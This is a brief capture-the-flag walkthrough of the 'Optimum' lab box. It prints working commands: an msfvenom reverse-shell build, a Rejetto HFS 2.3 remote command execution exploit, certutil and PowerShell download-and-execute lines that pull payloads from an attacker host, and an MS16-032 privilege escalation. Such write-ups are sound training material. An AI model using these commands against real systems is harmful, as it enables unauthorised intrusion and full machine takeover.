# Optimum (TJ Null/easy)  

## Nmap  

Ports 0-15000.  

```
80/tcp open  http    syn-ack HttpFileServer httpd 2.3
```  

Server header.  

`http-server-header: HFS 2.3`  

## Http 80  

Using searchsploit, a vulnerable version was found with a python exploit.  

`Rejetto HttpFileServer 2.3.x - Remote Command Execution`  

Creating a reverse shell.  

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.85 LPORT=4444 -f exe > shell.exe`  

Trying to retrieve the shell using the exploit and certutil did not work, a full path to certutil.exe was needed.  

`python exploit.py 10.129.72.112 80 "C:\Windows\System32\certutil.exe -urlcache -f http://10.10.14.85:8000/shell.exe c:\Windows\Temp\shell.exe"`  

Executing reverse shell.  

`python exploit.py 10.129.72.112 80 "c:\Windows\Temp\shell.exe"`  

Returning a shell.  

```
whoami
optimum\kostas
```  

## Priv Esc  

Using searchsploit, this OS is vulnerable to MS016-032.  

I edited the empire Invoke-MS16032.ps1 script with the following line, which just calls the function within the script with a argument that downloads and executes a rev shell.  

`Invoke-MS16-032 -Cmd "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.87:8000/powertcp.ps1')"`  

Also, this box is 64 bit and not 32, which matters greatly on kernel exploits. Each powershell address I changed System32 to SysWOW64 for powershell 64 bit.  

Calling the file in the rev shell.  

`C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.87:8000/Invoke-MS16032.ps1')"`  

To gain root shell. ***Important*** I tried to do the above command using the word 'powershell' and it did not work. It needed the full path 'C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe' to return a shell.
